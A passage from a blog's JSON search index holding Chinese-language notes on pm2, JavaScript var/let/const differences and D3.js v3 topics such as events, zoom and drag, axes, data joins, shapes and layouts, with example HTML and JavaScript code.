查看进程详情pm2 monit # 查看CPU和内存资源占用 8. 启动 HTTP 服务pm2 serve|expose [options] [path] [port] 例如 pm2 serve ./dist 8888，在 dist 目录启动 http 服务，端口号为 8888","categories":[{"name":"杂项","slug":"杂项","permalink":"https://xuxb.github.io/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"server","slug":"server","permalink":"https://xuxb.github.io/tags/server/"},{"name":"node","slug":"node","permalink":"https://xuxb.github.io/tags/node/"}]},{"title":"var、let 与 const","slug":"JavaScript/var、let 与 const","date":"2021-04-27T06:24:48.000Z","updated":"2021-04-30T09:51:21.749Z","comments":true,"path":"2021/04/27/JavaScript/var、let 与 const/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/var%E3%80%81let%20%E4%B8%8E%20const/","excerpt":"","text":"var、let 与 const 的区别 作用域 var 只有函数作用域 let、const 为块级作用域 变量提升 var 会存在变量提升，提升至函数作用域的最上面，不包含赋值 let、const 不存在变量提升，在声明之前调用变量会报错 暂时性死区 var 声明不会有暂时性死区 let、const 声明会有暂时性死区，会报 xxx is not defined 重复声明 var 可以重复声明 let、const 不可以在同一作用域内重复声明 全局对象 val 声明的全局变量会挂在顶层对象(window、global)下面 let、const 声明的全局变量不会挂在顶层对象下 暂时性死区的作用：为了减少运行时错误，防止在变量声明前就使用这个变量，从而导致意料之外的行为 const 声明的变量需要注意的点： const 需在初始化时赋值，且不可修改； const 声明为变量时，其地址不可变，当变量为对象时，可修改属性； 内存分配 var: 会直接在栈内存里预分配内存空间，然后在实际语句执行的时候，在存储对应的变量。如果是引用类型，那么会在堆内存里开开辟一个内存空间存储实际内容，栈内存会存储一个指向堆内存的指针。 let: 不会在栈内存里预分配内存空间，而且在栈内存分配变量时，会做一个检查，如果已经有相同变量名存在，就会报错。 变量提升给变量赋值的语句可以理解成三个步骤，创建、初始化、赋值 let、const 的创建过程提升了，初始化过程没有提升，所以会产生暂时性死区 var 的创建、初始化过程都提升了，所以在赋值前访问会得到 undefined function 的创建、初始化、赋值都被提升了 函数声明也会存在变量提升，且优先级比 var 高，函数赋值不会有变量提升 ES6 标准规定 var、function 声明的全局变量， 是全局对象的属性 let、const、class 声明的全局变量，不是全局对象的属性 12345678910111213141516171819// var 声明会存在变量提升(function() &#123; console.log(&#x27;name&#x27;, name); console.log(&#x27;typeof name&#x27;, typeof name); if (typeof name === &#x27;undefined&#x27;) &#123; var name = &#x27;Jack&#x27; console.log(&#x27;Goodbye &#x27; + name); &#125; else &#123; console.log(&#x27;Hello &#x27; + name); &#125;&#125;)()// ---- output -----// name undefined// typeof name undefined// Goodbye Jack// 说明： if 语句里的 var 声明没有块级作用域，会提升至函数的最上层","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"}]},{"title":"可视化交互","slug":"D3.js/可视化交互","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:14.932Z","comments":true,"path":"2021/03/24/D3.js/可视化交互/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%8F%AF%E8%A7%86%E5%8C%96%E4%BA%A4%E4%BA%92/","excerpt":"","text":"可视化交互1、事件类型 鼠标事件 click 单击 dbclick 双击 mousemove 鼠标移动 mouseenter 鼠标进入 mouseleave 鼠标离开 mouseover 鼠标滑入 mouseout 鼠标滑出 mousedown 鼠标按下 mouseup 鼠标弹起 触摸事件 touchstart 触摸点在屏幕上接触时 touchmove 触摸点在屏幕上移动时 touchend 触摸点在屏幕上移开时 缩放、平移事件 d3.behavior.zoom d3.behavior.zoom 创建一个缩放行为 zoom(selection) 将此缩放行为应用到 selection 上（一般使用 selection.call(zoom)） zoom.on(type, listener) 设置事件类型和监听器 zoomstart 缩放开始时 zoom 缩放中 zoomend 缩放结束时 zoom.scaleExtent() 设置缩放的最小、最大值，默认为 [0, +∞] zoom.scale() 设置初始的缩放大小 zoom.translate() 设置当前缩放的平移向量，默认为 [0, 0] zoom.duration() 取得或设置双击事件的过渡持续的时间 zoom.x() 设置 X轴 方向的比例尺 zoom.y() 设置 Y轴 方向的比例尺 拖拽事件 d3.behavior.drag d3.behavior.darg 创建一个拖拽行为 darg(selection) 将此拖拽行为应用到 selection 上（一般使用 selection.call(darg)） darg.on(type, listener) 设置事件类型和监听器 dargstart 拖拽开始时 darg 拖拽中 dargend 拖拽结束时 dray.origin() 设置拖动行为的原点 2、事件对象 d3.event说明 d3.evnet 对象是 DOM 事件，并实现了标准事件字段 event.x: 相对于可视区的坐标（与 event.clientX 一样） event.clientX: 相对于可视区的坐标（与滚动的距离无关，以浏览器左上角为基准） event.offsetX: 相对于容器的坐标（鼠标与触发事件的元素的距离） event.pageX: 鼠标位置相对于文档的坐标（包含滚动的距离，以文档左上角为基准） event.screenX: 鼠标位置相对于屏幕 X 轴的坐标（与滚动的距离无关，以屏幕左上角为基准） event.translate: 返回鼠标位移的数据，如 [100, 20] event.scale: 返回鼠标缩放的大小，如 1.2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .circle-item &#123; fill: none; stroke: #090; stroke-width: 4; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = document.documentElement.clientWidth; let h = document.documentElement.clientHeight; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); svg.append(&#x27;text&#x27;) .attr(&#x27;x&#x27;, 10) .attr(&#x27;y&#x27;, 24) .attr(&#x27;class&#x27;, &#x27;mouse-info&#x27;); function updateInfo(str) &#123; svg.select(&#x27;.mouse-info&#x27;).text(str); &#125; svg.on(&#x27;mousemove&#x27;, () =&gt; &#123; let event = d3.event; let str = `x ：$&#123;event.offsetX&#125; \\n Y: $&#123;event.offsetY&#125;`; updateInfo(str); &#125;); svg.on(&#x27;click&#x27;, function () &#123; let event = d3.event; console.log(event); let x = event.offsetX; let y = event.offsetY; let data = [1, 2, 3, 4]; svg.selectAll(&#x27;cirle&#x27;) .data(data) .enter() .append(&#x27;circle&#x27;) .attr(&#x27;class&#x27;, &#x27;circle-item&#x27;) .attr(&#x27;cx&#x27;, x) .attr(&#x27;cy&#x27;, y) .attr(&#x27;r&#x27;, 0) .transition() .duration(2000) .delay((d, i) =&gt; Math.pow(i + 1, 2) * 100) .ease(&#x27;ease-out&#x27;) .attr(&#x27;r&#x27;, 500) .style(&#x27;stroke-width&#x27;, 1) .style(&#x27;opacity&#x27;, 0) .each(&#x27;end&#x27;, function () &#123; d3.select(this).remove(); &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .circle-item &#123; opacity: .5; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 800; let h = 600; let r = 60; let data = [&#123; x: w / 2 - r, y: w / 2 - r &#125;, &#123; x: w / 2 - r, y: w / 2 + r &#125;, &#123; x: w / 2 + r, y: w / 2 - r &#125;, &#123; x: w / 2 + r, y: w / 2 + r &#125;]; function dragHandler() &#123; let event = d3.event; d3.select(this) .attr(&#x27;transform&#x27;, `translate($&#123;event.x&#125;, $&#123;event.y&#125;)`); &#125; let drag = d3.behavior.drag().on(&#x27;drag&#x27;, dragHandler); let color = d3.scale.category10(); let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;); container.selectAll(&#x27;circle&#x27;) .data(data) .enter() .append(&#x27;circle&#x27;) .attr(&#x27;class&#x27;, &#x27;circle-item&#x27;) .attr(&#x27;transform&#x27;, d =&gt; `translate($&#123;d.x&#125;, $&#123;d.y&#125;)`) .attr(&#x27;r&#x27;, 60) .style(&#x27;fill&#x27;, (d, i) =&gt; color(i)) .call(drag); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .circle-item &#123; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 800; let h = 600; let r = 60; let data = [&#123; x: w / 2 - r, y: w / 2 - r &#125;, &#123; x: w / 2 - r, y: w / 2 + r &#125;, &#123; x: w / 2 + r, y: w / 2 - r &#125;, &#123; x: w / 2 + r, y: w / 2 + r &#125;]; function zoomHandler () &#123; let event = d3.event; d3.select(&#x27;.container&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;event.translate&#125;) scale($&#123;event.scale&#125;)`); &#125; let zoom = d3.behavior.zoom() .scaleExtent([1, 10]) .on(&#x27;zoom&#x27;, zoomHandler); let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h) .call(zoom); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;); container.selectAll(&#x27;circle&#x27;) .data(data) .enter() .append(&#x27;circle&#x27;) .attr(&#x27;class&#x27;, &#x27;circle-item&#x27;) .attr(&#x27;transform&#x27;, d =&gt; `translate($&#123;d.x&#125;, $&#123;d.y&#125;)`) .attr(&#x27;r&#x27;, 60); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"坐标轴","slug":"D3.js/坐标轴","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:25.108Z","comments":true,"path":"2021/03/24/D3.js/坐标轴/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%9D%90%E6%A0%87%E8%BD%B4/","excerpt":"","text":"坐标轴说明：使用 let axis = d3.svg.axis() 生成坐标轴 坐标轴上所有的文字、线段都以轴最外面的元素 g 为标准进行布局，并设置 g 元素的 transform: tanslate(x, y)（如果没有 g 元素，则会以根元素 svg 为标准） axis(selection)： 将轴绘制在选择集上，一般是添加到 g 元素上，与 selection.call(axis) 的功能一样 axis.orient(orientation)： orientation 参数设置坐标轴方向 ，并返回轴（可选值为 bottom、top、left、right，默认为 bottom） axis.tickValues(arr): 指定的数值将用于刻度中的文本 axis.ticks(num)：num 参数设置或获取（当参数为空时）坐标轴刻度的个数 axis.innerTickSize(size)：size 参数设置或获取（当参数为空时）内部坐标轴刻度线的长度（px） axis.outerTickSize(size)：size 参数设置或获取（当参数为空时）外部坐标轴刻度线的长度（px） axis.tickSize(inner, outer)：设定或获取坐标轴内外刻度线的长度 axis.tickPadding(padding): padding 参数设置刻度线与文本间的距离 axis.tickFormat(fn): 格式化显示在坐标轴上的数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;D3.js - 坐标轴&lt;/title&gt; &lt;style&gt; .container &#123; border: 1px solid #999; &#125; .rect-background &#123; fill: #ddd; &#125; .axis path &#123; display: none; &#125; .axis line &#123; fill: none; stroke: #fff; shape-rendering: crispEdges; &#125; .axis text &#123; font-family: sans-serif; font-size: 12px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 960; let h = 600; let padding = 40; let xData = [-450, 450]; let yData = [-250, 250]; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let xScale = d3.scale.linear() .domain(xData) .range([0, w - padding * 2]); let yScale = d3.scale.linear() .domain(yData) .range([0, h - padding * 2]); let xAxis = d3.svg.axis() .scale(xScale) .orient(&#x27;bottom&#x27;) .tickSize(-h); let yAxis = d3.svg.axis() .scale(yScale) .orient(&#x27;left&#x27;) .tickSize(-w) .ticks(5); function zoomed() &#123; svg.select(&#x27;.x-axis&#x27;).call(xAxis); svg.select(&#x27;.y-axis&#x27;).call(yAxis); &#125; let zoom = d3.behavior.zoom() .x(xScale) .y(yScale) .scaleExtent([1, 3]) .on(&#x27;zoom&#x27;, zoomed); svg.append(&#x27;g&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, $&#123;padding&#125;)`) .append(&#x27;rect&#x27;) .attr(&#x27;class&#x27;, &#x27;rect-background&#x27;) .attr(&#x27;width&#x27;, w - padding * 2) .attr(&#x27;height&#x27;, h - padding * 2); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis x-axis&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, $&#123;h - padding&#125;)`) .call(xAxis); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis y-axis&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, $&#123;padding&#125;)`) .call(yAxis); svg.select(&#x27;.rect-background&#x27;).call(zoom); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"工具函数","slug":"D3.js/工具函数","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:30:58.469Z","comments":true,"path":"2021/03/24/D3.js/工具函数/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0/","excerpt":"","text":"工具函数数组 d3.range([start, ]stop[, step]): 生成一个包含算数级数的数组 d3.shuffle(): 随机化一个数组的顺序 d3.sum(): 计算数字数组的和 时间格式化 d3.time.format123var date = new Date();var formatter = d3.time.format(&#x27;%Y-%m-%d %H:%M:%S&#x27;);formatter(date); // 2018-01-26 16:38:05 %j：在本年中的天数 [001, 366]%y：不含纪元的年份 [00, 99]%Y：包含纪年的4位数年份%d：在本月的天数， 不足2位用0补全 [01, 31]%e：在本月的天数， 不足2位用空格补全 [ 1, 31]%m：月份 [01, 12]%b：月的缩写 // Jan%B：月的全称 // January%H：小时， 24小时制 [00, 23]%I：小时， 12小时制 [01, 12]%M：分钟 [00, 59]%S：秒 [00, 60]%L：毫秒 [000, 999]%a：星期的缩写 // Thu%A：星期的全称 // Thursday%p：AM或PM%x：日期部分， 等同于 %m%d%Y%X：时间部分， 等同于 %H:%M:%S 颜色序数比例尺 d3.scale.category10构造一个新的序数比例尺，使用以下 10（20）种颜色 d3.scale.category10() d3.scale.category20() d3.scale.category20b() d3.scale.category20c() 说明：该比例尺有默认的值域包含 10 中颜色，但并没有设置范围域。传递给比例尺函数的每个唯一值将从输出范围中分配一个新值。 123456789var scale = d3.scale.category10();scale(0); // #1f77b4scale(1); // #ff7f0escale(10); // #2ca02cscale.domain(); // [0, 1, 10]scale(10); // #2ca02cscale(15); // #d62728scale.domain(); // [0, 1, 10, 15]scale.range(); // [&quot;#1f77b4&quot;, &quot;#ff7f0e&quot;, &quot;#2ca02c&quot;, &quot;#d62728&quot;, &quot;#9467bd&quot;, &quot;#8c564b&quot;, &quot;#e377c2&quot;, &quot;#7f7f7f&quot;, &quot;#bcbd22&quot;, &quot;#17becf&quot;]","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"update、enter 与 exit","slug":"D3.js/update、enter 与 exit","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:29.128Z","comments":true,"path":"2021/03/24/D3.js/update、enter 与 exit/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/update%E3%80%81enter%20%E4%B8%8E%20exit/","excerpt":"","text":"update、enter 与 exit作用：处理选择集和数据集关系不确定的情况，对各种选择集分别作处理。 selection.data() 操作返回的是三个 Virtual selection，这三个 Virtual selection 是 enter、 update 以及 exit。 假设用三个 &lt;p&gt; 元素的选择集（对应的数据分别为 [0, 1, 2]）， 如果将新数据集 [3, 6, 9, 12, 15] 绑定到选择集上，则前三个数据（3，6，9）有与之对应的元素，这部分成为 Update而后面两个数据（12，15）没有与之对应的元素，这部分成为 Enter 如果将新数据集 [4, 6] 绑定到选择集上，则前两个数据（4，6）有与之对应的元素，这部分成为 Update而原来选择集最后一个数据（2）没有与之对应的元素，这部分成为 Exit ** update、enter、exit的区别** d3.selectAll(&#39;text&#39;) 的返回值是一个选择集，返回的是当前 DOM 的信息d3.selectAll(&#39;text&#39;).data(dataSet) 的返回值是一个选择集，有 enter()、exit() 方法，返回的是绑定前后对比的信息 update: 表示在 DOM 中即将被更新的选择集，update 部分的处理办法一般是：更新属性值，如 let updateSelection = svg.selectAll(&#39;circle&#39;).data(dataSet) enter: 表示在 DOM 中即将被添加的选择集，enter 部分的处理办法一般是：添加元素后，赋予属性值，如 let enterSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).enter() exit: 表示在 DOM 中即将被删除的选择集，exit 部分的处理办法一般是：修改属性值，删除元素，如 let exitSelection = svg.selectAll(&#39;circle&#39;).data(dataSet).exit() 说明：并没有 svg.selectAll(&#39;circle&#39;).data(dataSet).update() 方法，svg.selectAll(&#39;circle&#39;).data(dataSet) 直接返回 Update 选择集（） 比较的是数据集与选择集，而不是比较数据集与选择集中的数据（与 Vue 中的 key 属性、DOM元素复用没有任何联系） 当有通过数据更新视图时，正确的顺序应该是 update() 、enter()、exit() 重新将数据绑定到选择集上时，不可能同时存在 enter()、exit() 对于数组中的数据元素，如果缺少与之对应的 DOM 元素，那么就会有一个占位符来顶替，而 enter() 方法返回的就是这些占位符集合的引用。这个引用后只能链接 append()，insert() 以及 select() 操作符，通过他们来操作该引用所指向的集合。 data() 数据绑定（selection.selectAll().data().enter().append()） let selectoin = svg.selectAll(&#39;circle&#39;) 因为 SVG 容器是空的，返回一个新的空选择 selection。 enterSelectoin = selection.data(dataSet) 将这个选择连接到一组数据，产生三个新的选择，代表三种可能的状态：enter、update 和 exit。由于选择是空的，所以update 和 exit 的 selection 是空的，而 enter 的 selection 包含每个新基准的占位符。 selection.data(dataSet) 返回更新选择，selection.enter() 返回 enter 选择，而进入和退出选择被挂起 。 enterSelectoin.append() 将缺失的元素添加到 SVG 容器中，这会为每个数据附加一个新的 circle 到 SVG 容器。 当把数据分配到一个元素上时，这个数据被存储到该元素的 _data_ 属性中, 数据可以通过 _data_ 属性被再选。这也就是我们所说的数据绑定到 DOM 元素 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;D3.js - enter、update、exit&lt;/title&gt; &lt;style&gt; .container text &#123; font-size: 30px; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 500; let h = 400; let padding = &#123; top: 20, right: 20, bottom: 30, left: 40 &#125;; let dataSet = &#x27;abcdefghijklmn&#x27;.split(&#x27;&#x27;); let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding.left&#125;, $&#123;padding.top&#125;)`) .attr(&#x27;width&#x27;, w - padding.left - padding.right) .attr(&#x27;height&#x27;, h - padding.top - padding.bottom); function update(dataSet) &#123; let texts = container.selectAll(&#x27;text&#x27;).data(dataSet/* , (d) =&gt; d */); console.log(dataSet); // update 部分 texts.attr(&#x27;x&#x27;, (data, i) =&gt; i * 30) .attr(&#x27;y&#x27;, 120) .style(&#x27;fill&#x27;, &#x27;#f00&#x27;) .text((data) =&gt; &#123; console.log(&#x27;update ----&gt; &#x27; + data); return data; &#125;); // enter 部分 texts.enter() .append(&#x27;text&#x27;) .attr(&#x27;x&#x27;, (data, i) =&gt; i * 30) .attr(&#x27;y&#x27;, 120) .style(&#x27;fill&#x27;, &#x27;#0f0&#x27;) .text((data) =&gt; &#123; console.log(&#x27;enter ----&gt; &#x27; + data); return data; &#125;); // exit 部分 texts.exit() .transition() .duration(200) .style(&#x27;opacity&#x27;, (data) =&gt; &#123; console.log(&#x27;exit ----&gt; &#x27; + data); return 0; &#125;) .style(&#x27;transform&#x27;, &#x27;scale(0)&#x27;) .remove(); &#125; window.setInterval(() =&gt; &#123; let data = [&#x27;A&#x27;, &#x27;B&#x27;, ...d3.shuffle(dataSet).slice(0, Math.ceil(Math.random() * 10))]; update(data); &#125;, 1000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"形状","slug":"D3.js/形状","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:17.703Z","comments":true,"path":"2021/03/24/D3.js/形状/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%BD%A2%E7%8A%B6/","excerpt":"","text":"形状线条生成器 d3.svg.line line.x() line.y() line.interpolate() linear：分段的线性片段，如折线。 step：水平和垂直片段之间交替，如台阶函数。 step-before：垂直和水平片段之间交替，如台阶函数。 step-after： 水平和垂直片段之间交替，如台阶函数。 basis：一个B-spline，在末尾控制点的重复。 basis-open：一个开放的B-spline；首尾不相交。 cardinal：一个Cardinal spline，在末尾控制点的重复。 cardinal-open：一个开放的Cardinal spline；首尾不相交，但是会和其他控制点相交。 monotone：立方插值(cubic interpolation)保存y值得单调性。 line.tension() 区域生成器 d3.svg.area area.x() area.y0() area.y1() area.interpolate() area.tensioin() 圆弧生成器 d3.svg.arc arc() 生成一个像饼图或圆环图中的固定弧度 arc.centroid(args) 计算弧中心，返回值为一个数组 arc.innerRadius() 获取或设置内半径访问器 arc.outerRadius() 获取或设置外半径访问器 arc.cornerRadius() 获取或设置拐角（corner）半径访问器 arc.startAngle() 获取或设置开始角度访问器 arc.endAngle() 获取或设置结束角度访问器 arc.padAngle() 获取或设置填补（pad）角度访问器 arc.padRadius() 获取或设置填补（pad）半径访问器 1234567891011121314151617181920212223242526272829303132333435363738394041424344let w = 600;let h = 400;let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h);let endAngle = 2 * Math.PI;let data = [&#123; startAngle: 0, endAngle: 0.1 * endAngle &#125;, &#123; startAngle: 0.1 * endAngle, endAngle: 0.2 * endAngle &#125;, &#123; startAngle: 0.2 * endAngle, endAngle: 0.4 * endAngle &#125;, &#123; startAngle: 0.4 * endAngle, endAngle: 0.6 * endAngle &#125;, &#123; startAngle: 0.6 * endAngle, endAngle: 0.7 * endAngle &#125;, &#123; startAngle: 0.7 * endAngle, endAngle: 0.9 * endAngle &#125;, &#123; startAngle: 0.9 * endAngle, endAngle: endAngle &#125;];let arc = d3.svg.arc() .innerRadius(100) .outerRadius(150);let color = d3.scale.category10();svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;arc&#x27;) .attr(&#x27;transform&#x27;, &#x27;translate(250, 250)&#x27;).selectAll(&#x27;path&#x27;) .data(data) .enter() .append(&#x27;path&#x27;) .style(&#x27;fill&#x27;, (d, i) =&gt; color(i)) .transition() .duration(1200) .attrTween(&#x27;d&#x27;, (d) =&gt; &#123; let start = &#123; startAngle: 0, endAngle: 0 &#125;; let interpolate = d3.interpolate(start, d); return (t) =&gt; arc(interpolate(t)); &#125;);","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"布局","slug":"D3.js/布局","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:30:46.361Z","comments":true,"path":"2021/03/24/D3.js/布局/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%B8%83%E5%B1%80/","excerpt":"","text":"布局1、饼布局 d3.layout.pie pie.endAngl 取得或设置饼布局整体的结束角度 pie.padAngle 取得或设置饼布局填充角度 pie.sort 控制饼片段的顺时针方向的顺序 pie.startAngle 取得或设置饼布局整体的开始角度 pie.value 取得或设置值访问器函数 pie 计算饼图或圆环图中弧的开始和结束角度 力布局 d3.layout.force force.links() 取得或者设置节点间的链接数组 force.nodes() 取得或者设置布局的节点数组 force.size() 取得或者设置布局大小 force.linkDistance() 取得或者设置链接距离 force.charge() 取得或者设置电荷强度 force.on() 监听在计算布局位置时的更新 start 力学图运动开始 tick 力学图运动中 end 力学图运动结束 force.drag() 给节点绑定拖动行为 dragstart 单个节点拖拽开始 drag 单个节点拖拽中 dragend 单个节点拖拽结束 force.alpha() 取得或者设置力布局的冷却参数 树布局 d3.layout.tree tree() tree.nodes的别名 tree.children() 取得或设置孩子访问器 tree.size() 用x和y指定树的尺寸 tree.nodes() 计算父布局并返回一组节点 tree.links() 计算树节点的父-子连接 tree.sort() 控制遍历顺序中兄弟节点的顺序 tree.nodeSize() 为每个节点指定一个固定的尺寸 tree.separation() 取得或设置相邻节点的间隔函数","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"技巧","slug":"D3.js/技巧篇","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:12.302Z","comments":true,"path":"2021/03/24/D3.js/技巧篇/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E6%8A%80%E5%B7%A7%E7%AF%87/","excerpt":"","text":"技巧 画布区域要有留白 padding = [20, 20, 30, 40] Y 轴方向的尺度需要做倒置处理，因为浏览器默认 SVG 的 Y 轴是从上至下，但按照图标惯例是从下至上，所以数据项的值越大时，对应的 Y 轴坐标应该越小。为了处理这些逆转，可以在定义范围时交换这些值，如 d3.scale.linear().domain([0, maxVal]).range([height, 0]) &lt;g&gt; 元素内的所有元素都是以父元素 &lt;g&gt; 为标准进行排版 图形区域用 &lt;g&gt; 元素包裹 坐标轴区域用 &lt;g&gt; 元素包裹 图例区域用 &lt;g&gt; 元素包裹 … 